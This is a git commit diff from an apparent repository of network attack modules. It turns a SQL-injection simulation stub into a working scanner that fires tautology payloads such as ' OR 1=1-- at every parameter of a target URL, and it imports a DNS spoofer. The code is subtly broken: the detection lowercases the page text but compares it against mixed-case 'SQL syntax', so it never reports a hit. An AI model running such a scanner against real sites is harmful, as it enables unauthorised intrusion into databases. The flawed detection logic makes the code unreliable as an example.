e4c151b9eead046a234675910c3a6f7a287485f7
NripeshN <nn2012@hw.ac.uk>
2023-07-28 12:34:45 +0530

    sql_injection update

--- src/__init__.py
+++ src/__init__.py
@@ -2,4 +2,5 @@ from .dos_attack import DoSAttack
 from .ddos_attack import DDoSAttack
 from .sql_injection import SQLInjection
 from .mitm_attack import MITMAttack
+from .dns_spoofer import DNSSpoofer
 from .random_string_generator import RandomStringGenerator
--- src/sql_injection.py
+++ src/sql_injection.py
@@ -1,12 +1,62 @@
-class SQLInjection:
-    def __init__(self, db):
-        self.db = db  # a hypothetical database object
+import requests
+from bs4 import BeautifulSoup
+import logging
 
-    def simulate_attack(self, payload):
-        # In a real scenario, the payload would be a malicious SQL query.
-        # In this simulation, we simply pass it to the database's query method.
-        try:
-            result = self.db.query(payload)
-            return result
-        except Exception as e:
-            print(f"Exception occurred while querying the database: {e}")
+logging.basicConfig(level=logging.INFO)
+
+
+class SQLInjectionAttack:
+    def __init__(self, url, param_dict):
+        self.url = url
+        self.param_dict = param_dict
+        self.payloads = [
+            "' OR '1'='1",
+            ' OR 1=1; --',
+            '" OR 1=1; --',
+            "' OR 'a'='a",
+            '" OR "a"="a',
+            "' OR 1=1--",
+            '" OR 1=1--',
+            "` OR 1=1--",
+            "' OR 1=1/*",
+            "' OR 1=1#",
+            "' OR 1=1;%00",
+            "' OR 1=1; --",
+        ]
+
+    def inject_payload(self, payload):
+        for key in self.param_dict.keys():
+            injected_param_dict = self.param_dict.copy()
+            injected_param_dict[key] = payload
+
+            response = requests.get(self.url, params=injected_param_dict)
+            if self.is_vulnerable(response.text):
+                logging.info(
+                    f"Parameter '{key}' is susceptible to SQL Injection. "
+                    f"Payload: '{payload}'"
+                )
+                return True
+
+        return False
+
+    def is_vulnerable(self, response_text):
+        bs = BeautifulSoup(response_text, 'html.parser')
+        if bs.body and 'error in your SQL syntax' in bs.body.text.lower():
+            return True
+        return False
+
+    def attack(self):
+        for payload in self.payloads:
+            if self.inject_payload(payload):
+                logging.info(f"SQL Injection was successful with payload '{payload}'")
+                return True
+
+        logging.info("Site seems to be SQL Injection proof.")
+        return False
+
+
+if __name__ == '__main__':
+    url = "http://testphp.vulnweb.com"
+    param_dict = {"id": "1"}
+    sql_injection_attack = SQLInjectionAttack(url, param_dict)
+    sql_injection_attack.attack()
